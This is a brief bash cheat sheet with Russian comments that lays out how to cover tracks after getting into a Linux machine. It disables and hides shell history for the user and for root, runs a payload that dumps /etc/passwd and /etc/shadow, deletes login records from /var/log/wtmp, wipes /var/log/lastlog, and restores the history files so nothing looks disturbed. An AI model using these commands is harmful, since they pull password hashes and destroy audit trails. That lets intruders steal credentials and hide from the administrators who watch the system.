#! /bin/bash

# this is not a bash script. copy and paste commands line by line
mv .bash_history .bash_history.bak # сохранить оригинал истории bash
#sed -i '$ d' .bash_history.bak #удалить последнюю команду ('cp .bash_history .bash_history.bak') из bak файла

# выйти из сесси и зайти снова, чтобы удалить историю в памяти. (эти команды запишутся в .bash_history при выходе из системы)

set +o history #отключить историю

sudo su # не забыть проделать то же самое для root (если есть root и от его имени проделывались действия. скорее всего, придется. хотя бы из за utmpdump)
mv /root/.bash_history /root/.bash_history.bak
#sed -i '$ d' /root/.bash_history.bak

set +o history # отключить историю для root

# полезные действия от имени root (payload)
cat /etc/passwd
cat /etc/shadow

#wtmp ops
utmpdump /var/log/wtmp > /var/tmp/wtmp # копия wtmp
sed -i '$ d' /var/tmp/wtmp # удалить предыдущую запись о входе
sed -i '$ d' /var/tmp/wtmp # удалить запись о выходе
sed -i '$ d' /var/tmp/wtmp # удалить текущую запись о входе
# информация о последнем выходе из сессии будет присутствовать в /var/log/wtmp
utmpdump -r < /var/tmp/wtmp > /var/log/wtmp # восстановить wtmp
rm /var/tmp/wtmp

# очистить lastlog. пока только такой вариант
echo > /var/log/lastlog

#восстанавливаю истрию root
mv /root/.bash_history.bak /root/.bash_history
^D

#восстанавить истрию пользователя
mv .bash_history.bak .bash_history
